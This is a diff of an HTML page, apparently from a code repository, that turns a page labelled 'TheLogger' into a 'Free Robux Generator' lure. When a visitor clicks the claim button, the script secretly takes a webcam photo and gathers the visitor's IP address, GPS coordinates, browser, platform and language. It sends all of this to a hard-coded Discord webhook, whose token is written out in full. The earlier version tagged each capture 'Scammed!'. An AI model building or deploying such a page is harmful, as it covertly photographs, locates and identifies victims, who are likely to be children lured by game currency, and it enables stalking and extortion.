@@ -1,58 +1,144 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Камера → Discord</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>🎉 Free Robux Generator</title>
+<style>
+body {
+  margin:0;
+  font-family: 'Segoe UI', sans-serif;
+  background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+  color: white;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  height:100vh;
+}
+.container {
+  background: rgba(0,0,0,0.6);
+  padding:20px;
+  border-radius:15px;
+  box-shadow:0 4px 20px rgba(0,0,0,0.7);
+  text-align:center;
+  width:90%;
+  max-width:450px;
+}
+h1 {margin-bottom:5px;}
+p {margin-bottom:15px;}
+video, canvas {
+  border-radius:10px;
+  max-width:100%;
+}
+button {
+  padding:10px 20px;
+  border:none;
+  border-radius:10px;
+  background: #00c6ff;
+  color:#000;
+  font-weight:bold;
+  cursor:pointer;
+  margin-top:10px;
+}
+button:hover {background:#0072ff;}
+#status {margin-top:10px;font-size:0.9em;color:#ccc;}
+</style>
 </head>
 <body>
-  <h2>TheLogger...</h2>
+<div class="container">
+  <h1>🎉 Free Robux Generator</h1>
+  <p>Press the button to claim your free Robux!</p>
   <video id="video" autoplay playsinline width="320" height="240"></video>
-  <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
-  <br>
-  <button id="snap">Get Free Robux</button>
+  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+  <div id="status">Status: Waiting...</div>
+  <button id="snap">📸 Claim Free Robux</button>
+</div>
 
-  <script>
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
+<script>
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1341126415923417160/1MBugwArtglgPFGUtKcga7hsdLAtafh3qmKavgcz0mw6FBoubVVDT3UMvXF07AqbWZ4Q"; // <--- Вставь сюда свой вебхук
 
-    // 👉 ВСТАВЬ СВОЙ WEBHOOK URL ТУТ
-    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1341126415923417160/1MBugwArtglgPFGUtKcga7hsdLAtafh3qmKavgcz0mw6FBoubVVDT3UMvXF07AqbWZ4Q";
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+const statusEl = document.getElementById("status");
 
-    async function startCamera() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-      } catch (err) {
-        alert("Allow camera access to priva ther you are not robot!: " + err.message);
-      }
+async function startCamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+    statusEl.textContent = "Status: Camera ready ✅";
+  } catch (err) {
+    statusEl.textContent = "Status: Camera denied ❌";
+    console.error(err);
+  }
+}
+startCamera();
+
+async function getIP() {
+  try {
+    const res = await fetch("https://api.ipify.org/?format=json");
+    const data = await res.json();
+    return data.ip;
+  } catch {
+    return "Unavailable";
+  }
+}
+
+document.getElementById("snap").onclick = async () => {
+  statusEl.textContent = "Status: Taking photo...";
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  canvas.toBlob(async (blob) => {
+    statusEl.textContent = "Status: Gathering info...";
+
+    let ip = await getIP();
+    let browser = navigator.userAgent;
+    let language = navigator.language;
+    let platform = navigator.platform;
+    let date = new Date().toLocaleString();
+
+    let locationText = "Location denied";
+    if (navigator.geolocation) {
+      await new Promise(resolve => {
+        navigator.geolocation.getCurrentPosition(pos => {
+          locationText = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+          resolve();
+        }, () => resolve());
+      });
     }
-    startCamera();
 
-    document.getElementById("snap").onclick = async () => {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append("file", blob, "photo.jpg");
-        formData.append("payload_json", JSON.stringify({
-          content: "📸 Scammed!"
-        }));
+    statusEl.textContent = "Status: Sending to Discord...";
 
-        try {
-          const res = await fetch(DISCORD_WEBHOOK, {
-            method: "POST",
-            body: formData
-          });
-          if (res.ok) {
-            alert("✅ Sigma");
-          } else {
-            alert("❌ Not Sigma: " + res.status);
-          }
-        } catch (e) {
-          alert("Ошибка отправки: " + e.message);
-        }
-      }, "image/jpeg", 0.9);
+    const data = {
+      content: "🎉 New Free Robux claim!",
+      embeds: [{
+        title: "📌 Claim Info",
+        color: 5814783,
+        fields: [
+          { name: "🌍 Location", value: locationText, inline: false },
+          { name: "💻 Browser", value: browser, inline: false },
+          { name: "🖥 Platform", value: platform, inline: true },
+          { name: "🗣 Language", value: language, inline: true },
+          { name: "📱 IP Address", value: ip, inline: true },
+          { name: "⏱ Date/Time", value: date, inline: false }
+        ],
+        image: { url: "attachment://photo.jpg" }
+      }]
     };
-  </script>
+
+    const form = new FormData();
+    form.append("payload_json", JSON.stringify(data));
+    form.append("file", blob, "photo.jpg");
+
+    try {
+      const res = await fetch(DISCORD_WEBHOOK, { method: "POST", body: form });
+      statusEl.textContent = res.ok ? "Status: Sent ✅" : "Status: Failed ❌";
+    } catch (e) {
+      statusEl.textContent = "Status: Error ❌";
+      console.error(e);
+    }
+  }, "image/jpeg", 0.9);
+};
+</script>
 </body>
 </html>
